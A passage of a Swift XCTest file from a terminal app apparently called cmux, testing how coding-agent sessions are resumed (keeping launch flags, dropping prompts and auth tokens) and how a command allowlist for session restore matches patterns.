        XCTAssertFalse(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 9))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 16))
    }

    func testAcceptLoopCleanupUnlinkPolicySkipsDuringListenerStartup() {
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: true
            )
        )
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: false,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: false
            )
        )
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: true,
                activeGeneration: 7,
                listenerStartInProgress: false
            )
        )
        XCTAssertTrue(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: false
            )
        )
    }

    func testClaudeResumeCommandPreservesLaunchFlagsAndDropsInjectedHookSettings() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-123",
            workingDirectory: "/tmp/cmux project",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "/opt/Claude Code/bin/claude",
                arguments: [
                    "/opt/Claude Code/bin/claude",
                    "--model",
                    "sonnet",
                    "--permission-mode",
                    "auto",
                    "--settings",
                    #"{"hooks":{"SessionStart":[{"hooks":[{"command":"cmux claude-hook session-start"}]}]}}"#,
                    "--session-id",
                    "old-session",
                    "initial prompt should not replay"
                ],
                workingDirectory: "/tmp/cmux project",
                environment: ["CLAUDE_CONFIG_DIR": "/tmp/claude config"],
                capturedAt: 123,
                source: "environment"
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "cd '/tmp/cmux project' && 'env' 'CLAUDE_CONFIG_DIR=/tmp/claude config' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV=1' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV_KEYS=CLAUDE_CONFIG_DIR' '/opt/Claude Code/bin/claude' '--resume' 'claude-session-123' '--model' 'sonnet' '--permission-mode' 'auto'"
        )
    }

    func testRestorableAgentStartupInputUsesInlineCommandWhenShort() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-123",
            workingDirectory: "/tmp/cmux project",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "/opt/Claude Code/bin/claude",
                arguments: [
                    "/opt/Claude Code/bin/claude",
                    "--model",
                    "sonnet"
                ],
                workingDirectory: "/tmp/cmux project",
                environment: nil,
                capturedAt: 123,
                source: "environment"
            )
        )

        XCTAssertEqual(snapshot.resumeStartupInput(), snapshot.resumeCommand.map { $0 + "\n" })
    }

    func testRestorableAgentStartupInputUsesLauncherScriptWhenCommandExceedsTerminalInputBudget() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-agent-resume-test-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let longPath = "/tmp/" + String(repeating: "nested-path-", count: 120)
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .codex,
            sessionId: "019dad34-d218-7943-b81a-eddac5c87951",
            workingDirectory: "/tmp/repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "codex",
                executablePath: "/Users/example/.bun/bin/codex",
                arguments: [
                    "/Users/example/.bun/bin/codex",
                    "--model",
                    "gpt-5.4",
                    "--add-dir",
                    longPath,
                    "initial prompt should not replay"
                ],
                workingDirectory: "/tmp/repo",
                environment: ["CODEX_HOME": "/tmp/codex"],
                capturedAt: 123,
                source: "environment"
            )
        )

        let input = try XCTUnwrap(snapshot.resumeStartupInput(temporaryDirectory: tempDir))
        XCTAssertLessThanOrEqual(input.utf8.count, SessionRestorableAgentSnapshot.maxInlineStartupInputBytes)
        XCTAssertTrue(input.hasPrefix("/bin/zsh '"))
        XCTAssertFalse(input.contains(longPath))

        let trimmedInput = input.trimmingCharacters(in: .whitespacesAndNewlines)
        let prefix = "/bin/zsh '"
        let scriptPath = String(trimmedInput.dropFirst(prefix.count).dropLast())
        let scriptContents = try String(contentsOfFile: scriptPath, encoding: .utf8)
        XCTAssertTrue(scriptContents.contains(longPath))
        XCTAssertTrue(scriptContents.contains("'resume'"))
        XCTAssertTrue(scriptContents.contains("'019dad34-d218-7943-b81a-eddac5c87951'"))

        let attributes = try FileManager.default.attributesOfItem(atPath: scriptPath)
        let permissions = try XCTUnwrap(attributes[.posixPermissions] as? NSNumber).intValue & 0o777
        XCTAssertEqual(permissions, 0o600)
    }

    func testRestorableAgentStartupInputSkipsOversizedCommandWhenScriptCannotBeWritten() throws {
        let tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-agent-resume-test-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let blockedDirectory = tempDir.appendingPathComponent("not-a-directory", isDirectory: false)
        try "occupied".write(to: blockedDirectory, atomically: true, encoding: .utf8)
        let longPath = "/tmp/" + String(repeating: "nested-path-", count: 120)
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .codex,
            sessionId: "019dad34-d218-7943-b81a-eddac5c87951",
            workingDirectory: "/tmp/repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "codex",
                executablePath: "/Users/example/.bun/bin/codex",
                arguments: [
                    "/Users/example/.bun/bin/codex",
                    "--model",
                    "gpt-5.4",
                    "--add-dir",
                    longPath,
                    "initial prompt should not replay"
                ],
                workingDirectory: "/tmp/repo",
                environment: ["CODEX_HOME": "/tmp/codex"],
                capturedAt: 123,
                source: "environment"
            )
        )

        XCTAssertNil(snapshot.resumeStartupInput(temporaryDirectory: blockedDirectory))
    }

    func testClaudeResumeCommandPreservesDangerouslySkipPermissionsAndObservedEnvironment() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "24ec0052-450c-4914-b1dd-2ee80d4bc84b",
            workingDirectory: "/Users/lawrence/fun",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "/Users/lawrence/.local/bin/claude",
                arguments: [
                    "/Users/lawrence/.local/bin/claude",
                    "--dangerously-skip-permissions"
                ],
                workingDirectory: "/Users/lawrence/fun",
                environment: [
                    "CLAUDE_CONFIG_DIR": "/Users/lawrence/.codex-accounts/claude/_p1775010019397",
                    "PATH": "/Users/lawrence/.local/bin:/usr/bin",
                    "SHELL": "/bin/zsh"
                ],
                capturedAt: 123,
                source: "environment"
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "cd '/Users/lawrence/fun' && 'env' 'CLAUDE_CONFIG_DIR=/Users/lawrence/.codex-accounts/claude/_p1775010019397' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV=1' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV_KEYS=CLAUDE_CONFIG_DIR' '/Users/lawrence/.local/bin/claude' '--resume' '24ec0052-450c-4914-b1dd-2ee80d4bc84b' '--dangerously-skip-permissions'"
        )
    }

    func testCodexResumeCommandPreservesFlagsAndDropsOriginalPrompt() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .codex,
            sessionId: "019dad34-d218-7943-b81a-eddac5c87951",
            workingDirectory: "/Users/example/repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "codex",
                executablePath: "/Users/example/.bun/bin/codex",
                arguments: [
                    "/Users/example/.bun/bin/codex",
                    "--model",
                    "gpt-5.4",
                    "--sandbox",
                    "danger-full-access",
                    "--ask-for-approval",
                    "never",
                    "--search",
                    "--cd",
                    "/Users/example/repo",
                    "initial prompt should not replay"
                ],
                workingDirectory: "/Users/example/repo",
                environment: ["CODEX_HOME": "/tmp/codex home"],
                capturedAt: 123,
                source: "process"
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "cd '/Users/example/repo' && 'env' 'CODEX_HOME=/tmp/codex home' '/Users/example/.bun/bin/codex' 'resume' '--model' 'gpt-5.4' '--sandbox' 'danger-full-access' '--ask-for-approval' 'never' '--search' '--cd' '/Users/example/repo' '019dad34-d218-7943-b81a-eddac5c87951'"
        )
    }

    func testClaudeTeamsResumeCommandPreservesRemoteControlLauncher() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-team-session",
            workingDirectory: "/tmp/team repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claudeTeams",
                executablePath: "/Applications/cmux.app/Contents/Resources/bin/cmux",
                arguments: [
                    "/Applications/cmux.app/Contents/Resources/bin/cmux",
                    "claude-teams",
                    "--teammate-mode",
                    "auto",
                    "--model",
                    "sonnet",
                    "--remote-control-session-name-prefix",
                    "cmux-team",
                    "--tmux",
                    "side effect should be dropped",
                    "--permission-mode",
                    "auto",
                    "initial team prompt"
                ],
                workingDirectory: "/tmp/team repo",
                environment: [
                    "CMUX_CUSTOM_CLAUDE_PATH": "/opt/Claude Code/bin/claude",
                    "PATH": "/opt/Claude Code/bin:/usr/bin"
                ],
                capturedAt: 123,
                source: "environment"
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "cd '/tmp/team repo' && 'env' 'CMUX_CUSTOM_CLAUDE_PATH=/opt/Claude Code/bin/claude' '/Applications/cmux.app/Contents/Resources/bin/cmux' 'claude-teams' '--resume' 'claude-team-session' '--teammate-mode' 'auto' '--model' 'sonnet' '--remote-control-session-name-prefix' 'cmux-team' '--permission-mode' 'auto'"
        )
    }

    func testClaudeResumeCommandHandlesOptionalDebugValueAndFilteredEnvironment() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-debug",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "claude",
                arguments: [
                    "claude",
                    "--debug",
                    "api,mcp",
                    "--model",
                    "sonnet",
                    "prompt should not replay"
                ],
                workingDirectory: nil,
                environment: [
                    "UNSAFE_TOKEN": "secret",
                    "NODE_OPTIONS": "--max-old-space-size=4096"
                ],
                capturedAt: nil,
                source: nil
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "'env' 'NODE_OPTIONS=--max-old-space-size=4096' 'claude' '--resume' 'claude-session-debug' '--debug' 'api,mcp' '--model' 'sonnet'"
        )
    }

    func testResumeCommandPreservesSafeProviderEnvironmentValuesOnly() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-env",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "claude",
                arguments: ["claude"],
                workingDirectory: nil,
                environment: [
                    "ANTHROPIC_AUTH_TOKEN": "third-party-auth-token",
                    "ANTHROPIC_BASE_URL": "https://api.example.test",
                    "ANTHROPIC_MODEL": "",
                    "PATH": " /tmp/bin ",
                    "UNSAFE_TOKEN": "secret"
                ],
                capturedAt: nil,
                source: nil
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "'env' 'ANTHROPIC_BASE_URL=https://api.example.test' 'ANTHROPIC_MODEL=' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV=1' 'CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV_KEYS=ANTHROPIC_BASE_URL,ANTHROPIC_MODEL' 'claude' '--resume' 'claude-session-env'"
        )
        XCTAssertFalse(snapshot.resumeCommand?.contains("ANTHROPIC_AUTH_TOKEN") ?? true)
    }

    func testClaudeResumeCommandStripsStaleCmuxNodeOptionsRestoreModule() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-node-options",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "claude",
                arguments: ["claude", "--model", "sonnet"],
                workingDirectory: nil,
                environment: [
                    "NODE_OPTIONS": "--require=/tmp/cmux-claude-node-options/restore-node-options.cjs --max-old-space-size=4096 --trace-warnings"
                ],
                capturedAt: nil,
                source: nil
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "'env' 'NODE_OPTIONS=--trace-warnings' 'claude' '--resume' 'claude-session-node-options' '--model' 'sonnet'"
        )
    }

    func testClaudeResumeCommandDropsEmptyStaleCmuxNodeOptionsEnvironment() {
        let snapshot = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-empty-node-options",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "claude",
                executablePath: "claude",
                arguments: ["claude", "--model", "sonnet"],
                workingDirectory: nil,
                environment: [
                    "NODE_OPTIONS": "--require /tmp/cmux-claude-node-options/restore-node-options.cjs --max-old-space-size 4096"
                ],
                capturedAt: nil,
                source: nil
            )
        )

        XCTAssertEqual(
            snapshot.resumeCommand,
            "'claude' '--resume' 'claude-session-empty-node-options' '--model' 'sonnet'"
        )
    }

    func testOpenCodeWrapperResumeCommandAndUnsupportedOhMyLaunchers() {
        let direct = SessionRestorableAgentSnapshot(
            kind: .opencode,
            sessionId: "direct-opencode-session-456",
            workingDirectory: "/tmp/direct opencode repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "opencode",
                executablePath: "/opt/homebrew/bin/opencode",
                arguments: [
                    "/opt/homebrew/bin/opencode",
                    "--model",
                    "anthropic/claude-sonnet-4-6",
                    "--session",
                    "old-session",
                    "--prompt",
                    "old prompt",
                    "--port",
                    "4096",
                    "/tmp/direct opencode repo",
                    "initial prompt"
                ],
                workingDirectory: "/tmp/direct opencode repo",
                environment: ["OPENCODE_CONFIG_DIR": "/tmp/opencode config"],
                capturedAt: 123,
                source: "environment"
            )
        )
        let omo = SessionRestorableAgentSnapshot(
            kind: .opencode,
            sessionId: "opencode-session-123",
            workingDirectory: "/tmp/opencode repo",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "omo",
                executablePath: "/usr/local/bin/cmux",
                arguments: [
                    "/usr/local/bin/cmux",
                    "omo",
                    "--model",
                    "anthropic/claude-sonnet-4-6",
                    "/tmp/opencode repo",
                    "initial prompt"
                ],
                workingDirectory: "/tmp/opencode repo",
                environment: ["OPENCODE_CONFIG_DIR": "/tmp/opencode config"],
                capturedAt: 123,
                source: "environment"
            )
        )
        let staleBunWorker = SessionRestorableAgentSnapshot(
            kind: .opencode,
            sessionId: "ses_24b0be92affeVRRBplLmUzbXQl",
            workingDirectory: "/Users/lawrence/fun",
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "opencode",
                executablePath: "/Users/lawrence/.bun/bin/opencode",
                arguments: [
                    "/Users/lawrence/.bun/bin/opencode",
                    "/$bunfs/root/src/cli/cmd/tui/worker.js"
                ],
                workingDirectory: "/Users/lawrence/fun",
                environment: [
                    "PATH": "/Users/lawrence/.bun/bin:/usr/bin",
                    "SHELL": "/bin/zsh"
                ],
                capturedAt: 123,
                source: "environment"
            )
        )
        let omx = SessionRestorableAgentSnapshot(
            kind: .codex,
            sessionId: "codex-session-123",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "omx",
                executablePath: "/usr/local/bin/cmux",
                arguments: ["/usr/local/bin/cmux", "omx", "team"],
                workingDirectory: nil,
                environment: nil,
                capturedAt: nil,
                source: nil
            )
        )
        let omc = SessionRestorableAgentSnapshot(
            kind: .claude,
            sessionId: "claude-session-123",
            workingDirectory: nil,
            launchCommand: AgentLaunchCommandSnapshot(
                launcher: "omc",
                executablePath: "/usr/local/bin/cmux",
                arguments: ["/usr/local/bin/cmux", "omc", "team"],
                workingDirectory: nil,
                environment: nil,
                capturedAt: nil,
                source: nil
            )
        )

        XCTAssertEqual(
            direct.resumeCommand,
            "cd '/tmp/direct opencode repo' && 'env' 'OPENCODE_CONFIG_DIR=/tmp/opencode config' '/opt/homebrew/bin/opencode' '--session' 'direct-opencode-session-456' '--model' 'anthropic/claude-sonnet-4-6' '--port' '4096' '/tmp/direct opencode repo'"
        )
        XCTAssertEqual(
            omo.resumeCommand,
            "cd '/tmp/opencode repo' && 'env' 'OPENCODE_CONFIG_DIR=/tmp/opencode config' '/usr/local/bin/cmux' 'omo' '--session' 'opencode-session-123' '--model' 'anthropic/claude-sonnet-4-6' '/tmp/opencode repo'"
        )
        XCTAssertEqual(
            staleBunWorker.resumeCommand,
            "cd '/Users/lawrence/fun' && '/Users/lawrence/.bun/bin/opencode' '--session' 'ses_24b0be92affeVRRBplLmUzbXQl'"
        )
        XCTAssertNil(omx.resumeCommand)
        XCTAssertNil(omc.resumeCommand)
    }

    func testRestorableAgentIndexLoadsLaunchCommandFromHookStore() throws {
        let home = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-agent-hook-store-\(UUID().uuidString)", isDirectory: true)
        let storeDir = home.appendingPathComponent(".cmuxterm", isDirectory: true)
        try FileManager.default.createDirectory(at: storeDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: home) }

        let workspaceId = UUID()
        let panelId = UUID()
        let storeURL = storeDir.appendingPathComponent("codex-hook-sessions.json", isDirectory: false)
        let json = """
        {
          "version": 1,
          "sessions": {
            "codex-session-123": {
              "sessionId": "codex-session-123",
              "workspaceId": "\(workspaceId.uuidString)",
              "surfaceId": "\(panelId.uuidString)",
              "cwd": "/tmp/repo",
              "updatedAt": 123,
              "launchCommand": {
                "launcher": "codex",
                "executablePath": "/usr/local/bin/codex",
                "arguments": [
                  "/usr/local/bin/codex",
                  "--model",
                  "gpt-5.4",
                  "--search",
                  "old prompt"
                ],
                "workingDirectory": "/tmp/repo",
                "environment": {
                  "CODEX_HOME": "/tmp/codex"
                },
                "capturedAt": 122,
                "source": "process"
              }
            }
          }
        }
        """
        try json.write(to: storeURL, atomically: true, encoding: .utf8)

        let index = RestorableAgentSessionIndex.load(homeDirectory: home.path)
        let snapshot = try XCTUnwrap(index.snapshot(workspaceId: workspaceId, panelId: panelId))

        XCTAssertEqual(snapshot.launchCommand?.arguments.first, "/usr/local/bin/codex")
        XCTAssertEqual(
            snapshot.resumeCommand,
            "cd '/tmp/repo' && 'env' 'CODEX_HOME=/tmp/codex' '/usr/local/bin/codex' 'resume' '--model' 'gpt-5.4' '--search' 'codex-session-123'"
        )
    }

}

final class SidebarDragFailsafePolicyTests: XCTestCase {
    func testRequestsClearWhenMonitorStartsAfterMouseRelease() {
        XCTAssertTrue(
            SidebarDragFailsafePolicy.shouldRequestClearWhenMonitoringStarts(
                isLeftMouseButtonDown: false
            )
        )
        XCTAssertFalse(
            SidebarDragFailsafePolicy.shouldRequestClearWhenMonitoringStarts(
                isLeftMouseButtonDown: true
            )
        )
    }

    func testRequestsClearForLeftMouseUpEventsOnly() {
        XCTAssertTrue(
            SidebarDragFailsafePolicy.shouldRequestClear(
                forMouseEventType: .leftMouseUp
            )
        )
        XCTAssertFalse(
            SidebarDragFailsafePolicy.shouldRequestClear(
                forMouseEventType: .leftMouseDragged
            )
        )
    }
}

// MARK: - Session Restore Command Settings Tests

final class SessionRestoreCommandSettingsTests: XCTestCase {
    // MARK: - Enabled Toggle Tests

    func testDisabledSettingBlocksAllCommands() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Explicitly disable restore commands
        defaults.set(false, forKey: SessionRestoreCommandSettings.enabledKey)

        // Even allowlisted commands should be blocked when disabled
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", defaults: defaults))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", defaults: defaults))
    }

    func testEnabledByDefaultWhenKeyNotSet() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Key not set should default to enabled (allowing allowlisted commands)
        // Use explicit allowlist to avoid coupling to shipped defaults
        defaults.set("testcmd *", forKey: SessionRestoreCommandSettings.allowlistKey)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("testcmd --flag", defaults: defaults))
    }

    func testExplicitlyEnabledAllowsCommands() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Explicitly enable restore commands
        defaults.set(true, forKey: SessionRestoreCommandSettings.enabledKey)
        // Use explicit allowlist to avoid coupling to shipped defaults
        defaults.set("testcmd *", forKey: SessionRestoreCommandSettings.allowlistKey)

        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("testcmd --flag", defaults: defaults))
    }

    // MARK: - Pattern Matching Tests

    func testExactMatchPatternMatchesOnlyExactCommand() {
        let allowlist = "opencode"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode-other", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("my-opencode", rawAllowlist: allowlist))
    }

    func testPrefixPatternMatchesCommandWithAndWithoutArgs() {
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode -c --model sonnet", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode-other", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("my-opencode", rawAllowlist: allowlist))
    }

    func testMultiplePatternsInAllowlist() {
        let allowlist = """
        opencode
        opencode *
        claude *
        npm run dev
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --model sonnet", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run build", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("yarn dev", rawAllowlist: allowlist))
    }

    func testCommentsAndBlankLinesAreIgnored() {
        let allowlist = """
        # This is a comment
        opencode

        # Another comment
        claude *
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("# This is a comment", rawAllowlist: allowlist))
    }

    func testWhitespaceTrimmingInCommands() {
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("  opencode --flag  ", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("\topencode\t", rawAllowlist: allowlist))
    }

    func testEmptyCommandIsNotAllowed() {
        let allowlist = "opencode *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("   ", rawAllowlist: allowlist))
    }

    // MARK: - Allowlist Wildcard Pattern Edge Cases

    func testPrefixPatternMatchesAbsolutePathCommands() {
        // Pattern "opencode *" should match "/usr/bin/opencode --flag" via basename extraction
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/opt/homebrew/bin/opencode --continue", rawAllowlist: allowlist))
        // But not if the basename doesn't match
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/other-tool", rawAllowlist: allowlist))
    }

    func testExactPatternMatchesAbsolutePathCommands() {
        // Exact pattern "opencode" should also match "/usr/bin/opencode" via basename
        let allowlist = "opencode"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/opt/homebrew/bin/opencode", rawAllowlist: allowlist))
        // But not with arguments (exact match)
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode --flag", rawAllowlist: allowlist))
    }

    func testMultiWordPrefixPattern() {
        // Multi-word prefix patterns like "npm run dev *"
        let allowlist = "npm run dev *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev --port 3000", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev --host 0.0.0.0 --port 3000", rawAllowlist: allowlist))
        // But not different npm commands
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run build", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run development", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm start", rawAllowlist: allowlist))
    }

    func testPatternWithTrailingWhitespace() {
        // Patterns with trailing whitespace should still work
        let allowlist = "opencode *  \n  claude *  "
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --model sonnet", rawAllowlist: allowlist))
    }

    func testAllowlistPatternIsCaseSensitive() {
        // Allowlist patterns should be case-sensitive (commands are case-sensitive on Unix)
        let allowlist = "OpenCode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("OpenCode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("OPENCODE --flag", rawAllowlist: allowlist))
    }

    func testSingleAsteriskPatternDoesNotMatchEverything() {
        // A pattern of just "*" should NOT be a universal wildcard
        // It would only match a literal command named "*"
        let allowlist = "*"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        // The pattern "* *" would match commands starting with "*" (not useful)
        let allowlist2 = "* *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist2))
    }

    func testPrefixPatternRequiresSpaceBeforeAsterisk() {
        // "opencode*" is NOT a prefix pattern - it's an exact match for "opencode*"
        let allowlist = "opencode*"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        // Only matches the literal "opencode*"
        // (This is intentional - we only support " *" suffix for prefix matching)
    }

    func testPatternMatchingWithSpecialCharactersInCommand() {
        // Commands with special characters should match correctly
        let allowlist = "my-app *\nmy_app *\nmy.app *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my-app --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my_app --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my.app --flag", rawAllowlist: allowlist))
    }

    func testPatternMatchingPreservesArgumentSpaces() {
        // Arguments with multiple spaces should be preserved
        let allowlist = "echo *"
        // Note: echo is blocked by denylist in some contexts, use a safe command
        let safeAllowlist = "myecho *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myecho hello world", rawAllowlist: safeAllowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myecho 'hello   world'", rawAllowlist: safeAllowlist))
    }

    // MARK: - Allowlist Normalization Tests

    func testNormalizedPatternsWithEmptyInputReturnsDefaults() {
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: nil)
        XCTAssertFalse(patterns.isEmpty)
        XCTAssertTrue(patterns.contains("opencode *"))
    }

    func testNormalizedPatternsWithWhitespaceOnlyReturnsEmpty() {
        // If user explicitly clears the allowlist, return empty to disable all restores
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: "   \n\n   ")
        XCTAssertTrue(patterns.isEmpty)
    }

    func testNormalizedPatternsFiltersCommentsAndBlanks() {
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: """
        # comment
        opencode

        claude *
        """)
        XCTAssertEqual(patterns, ["opencode", "claude *"])
    }

    // MARK: - Default Allowlist Tests

    func testDefaultAllowlistIncludesCodingAgents() {
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
